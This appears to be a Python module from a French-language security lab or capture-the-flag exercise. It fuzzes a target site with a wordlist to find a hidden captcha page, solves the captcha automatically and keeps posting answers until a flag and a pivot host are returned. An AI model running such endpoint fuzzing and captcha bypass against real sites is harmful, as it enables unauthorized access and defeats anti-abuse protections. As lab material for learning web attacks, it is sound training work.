from pathlib import Path

import requests

from src.tp3.utils.captcha import Captcha, build_templates
from src.tp3.utils.config import logger

WORDLIST = Path(__file__).resolve().parent.parent / "data" / "wordlist.txt"


class Session:
    """
    Phase web : trouve l'endpoint cache, franchit le captcha et recupere le pivot
    """

    def __init__(self, target: str, wordlist: Path = WORDLIST) -> None:
        """
        Prepare la session web pour la cible donnee
        """
        self.target = target.rstrip("/")
        self.wordlist = Path(wordlist)
        self.http = requests.Session()
        self.templates = build_templates()
        self.endpoint = ""
        self.result = {}

    def words(self) -> list:
        """
        Lit la wordlist embarquee (un mot par ligne)
        """
        lines = self.wordlist.read_text().splitlines()
        return [w.strip() for w in lines if w.strip() and not w.startswith("#")]

    def find_endpoint(self) -> str:
        """
        Fuzze la wordlist et retient la page qui contient un formulaire captcha
        """
        for word in self.words():
            url = f"{self.target}/{word}"
            try:
                response = self.http.get(url, timeout=5)
            except requests.RequestException:
                continue
            if response.status_code == 200 and "captcha" in response.text.lower():
                self.endpoint = url
                logger.info(f"Endpoint cache trouve : {url}")
                return url
        raise RuntimeError("endpoint cache introuvable")

    def solve_captcha(self) -> str:
        """
        Telecharge l'image du captcha (liee a la session) et la resout
        """
        image = self.http.get(f"{self.target}/captcha.png", timeout=5).content
        return Captcha(image, self.templates).solve()

    def breach(self, max_tries: int = 20) -> dict:
        """
        Ouvre la session puis poste la reponse du captcha jusqu'a obtenir le pivot
        """
        self.http.get(self.endpoint, timeout=5)  # pose le cookie de session
        for _ in range(max_tries):
            value = self.solve_captcha()
            response = self.http.post(self.endpoint, data={"captcha": value}, timeout=5)
            try:
                data = response.json()
            except ValueError:
                continue
            if "flag1" in data:
                self.result = data
                logger.info(f"flag1 recupere, pivot {data['host']}:{data['port']}")
                return data
        raise RuntimeError("captcha non franchi apres plusieurs essais")

    def run(self) -> dict:
        """
        Enchaine la decouverte de l'endpoint et le franchissement du captcha
        """
        self.find_endpoint()
        return self.breach()
